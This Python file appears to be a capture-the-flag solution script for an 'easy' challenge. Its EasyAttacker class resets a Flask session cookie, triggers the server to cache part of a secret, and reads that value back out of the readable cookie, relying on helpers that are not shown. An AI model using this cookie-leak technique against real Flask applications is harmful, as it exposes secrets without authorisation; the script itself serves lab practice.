"""
    A solution for the easy challenge, a flask-session based user cache
"""

from attack_util import *

class EasyAttacker(Attacker):
    """The attacker script for the easy challenge.
    
    Extends Attacker so all attributes there apply

    Attributes:
        empty_cookie (str): the session cookie upon creation,
            should have an empty cache on creation.
    """
    CACHE_NAME = 'cache_for_part_to_dict'
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.empty_cookie = self.session_cookie
    
    def flush_cache(self):
        """A complete flush of the cache, reset to empty cookie"""
        self.session_cookie = self.empty_cookie
    
    @property
    def session_cache(self):
        """dict: the session cache as stored in the current cookie"""
        return self.get_cookie_data(self.CACHE_NAME)       
    
    def find_part(self, part):
        self.flush_cache()
        self.leak_user_part_to_cache(part)
        cache_key = list(self.session_cache.keys())[0]   # only one value
        return part_repr_to_bits(cache_key[1:-2])
    
if __name__ == '__main__':
    print(EasyAttacker.attack(verbose=True))